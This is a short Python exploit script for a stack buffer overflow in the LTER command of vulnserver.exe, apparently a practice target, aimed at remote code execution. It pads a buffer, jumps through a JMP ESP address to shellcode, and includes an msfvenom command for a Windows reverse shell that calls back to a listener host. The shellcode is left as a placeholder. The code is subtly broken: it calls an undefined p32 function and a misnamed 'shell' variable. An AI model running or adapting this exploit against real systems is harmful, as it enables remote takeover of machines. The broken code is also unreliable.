# Programmer: Brent "q0m" Chambers
# Date: 7/12/2016
# Filename: lter_rce.py
# Description: Exploitation of vulnserver.exe's LTER command for remote code execution
# ************************************************************************************

#!/usr/bin/env python

import os
import sys
import string
import struct
import socket
from subprocess import Popen,PIPE

def execute(host,port,payload_list = [],recv_first=None):
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((host,int(port)))
	if len(payload_list):
		if recv_first:
			print s.recv(1024)
		for i in payload_list:
			s.send(i)
			print s.recv(1024)
	s.close()

# Shellcode generator command with MSFVENOM:
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.21 LPORT=443  BufferRegister=ESP EXITFUNC=thread -f raw 
shellcode = ( <shellcode> )

def x86(addr):
	return struct.pack("<I",addr)

jmp_esp = p32(0x62501203)

payload = [ "LTER /:./%s\n" %('A'*2003+jmp_esp+shellcode+'C'*(3000-2007-len(shell))) ]

host = "192.168.100.21"
port = 9999

execute(host,
		port,
		payload_list=payload,
		recv_first=True)